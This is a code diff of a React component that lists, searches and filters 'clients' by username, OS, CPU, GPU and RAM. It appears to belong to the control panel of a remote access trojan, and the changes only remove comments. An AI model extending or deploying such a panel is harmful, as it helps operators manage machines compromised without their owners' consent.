@@ -20,7 +20,6 @@ export const Clients = () => {
   const { clientList } = useContext(RATContext)!;
   const [contextMenu, setContextMenu] = useState<ContextMenuType | null>(null);
 
-  // Search and filter functionality
   const [searchTerm, setSearchTerm] = useState("");
 
   const [filters, setFilters] = useState<FilterCategories>({
@@ -32,7 +31,6 @@ export const Clients = () => {
   const [activeFilterTab, setActiveFilterTab] =
     useState<keyof FilterCategories>("group");
 
-  // Initialize filters based on client properties
   useEffect(() => {
     if (clientList && clientList.length > 0) {
       const groupValues = new Set<string>();
@@ -41,18 +39,15 @@ export const Clients = () => {
       const gpuValues = new Set<string>();
 
       clientList.forEach((client: RATClient) => {
-        // Add values to respective sets
         groupValues.add(client.data.group);
         osValues.add(client.system.os_full_name);
         cpuValues.add(client.cpu.cpu_name);
 
-        // Add each GPU to the set
         client.gpus.forEach((gpu) => {
           gpuValues.add(gpu.name);
         });
       });
 
-      // Initialize filters with all options checked
       const initialFilters: FilterCategories = {
         group: {},
         os: {},
@@ -60,7 +55,6 @@ export const Clients = () => {
         gpus: {},
       };
 
-      // Set initial values for each filter category
       groupValues.forEach((value) => {
         initialFilters.group[value] = true;
       });
@@ -81,10 +75,8 @@ export const Clients = () => {
     }
   }, [clientList]);
 
-  // Filter clients based on search term and selected filters
   const filteredClients = useMemo(() => {
     return clientList.filter((client: RATClient) => {
-      // Check if client matches search term
       const matchesSearch =
         searchTerm === "" ||
         client.system.username
@@ -101,12 +93,10 @@ export const Clients = () => {
         client.ram.total_gb.toString().includes(searchTerm) ||
         client.gpus.some((gpu) => gpu.name.toLowerCase().includes(searchTerm));
 
-      // Check if client passes all filters
       const passesGroupFilter = filters.group[client.data.group] !== false;
       const passesOsFilter = filters.os[client.system.os_full_name] !== false;
       const passesCpuFilter = filters.cpu[client.cpu.cpu_name] !== false;
 
-      // Check if at least one GPU passes the filter
       const passesGpuFilter = client.gpus.some(
         (gpu) => filters.gpus[gpu.name] !== false
       );
@@ -180,7 +170,6 @@ export const Clients = () => {
       <VisitWebsiteModal selectedClient={selectedClient} />
 
       <div className="flex flex-col h-full">
-        {/* Search and filter bar */}
         <TableFilter
           searchTerm={searchTerm}
           setSearchTerm={setSearchTerm}
@@ -194,7 +183,6 @@ export const Clients = () => {
           }
         />
 
-        {/* Main content */}
         <div className="flex flex-row flex-1">
           <div className="flex-1 overflow-auto bg-secondarybg text-black rounded-2xl px-4 sm:px-6 lg:px-8">
             <div className="flow-root">
@@ -222,7 +210,6 @@ export const Clients = () => {
             </div>
           </div>
 
-          {/* Details panel */}
           <div
             className={`w-100 px-2 h-full ${
               selectedClientDetails ? "block" : "hidden"
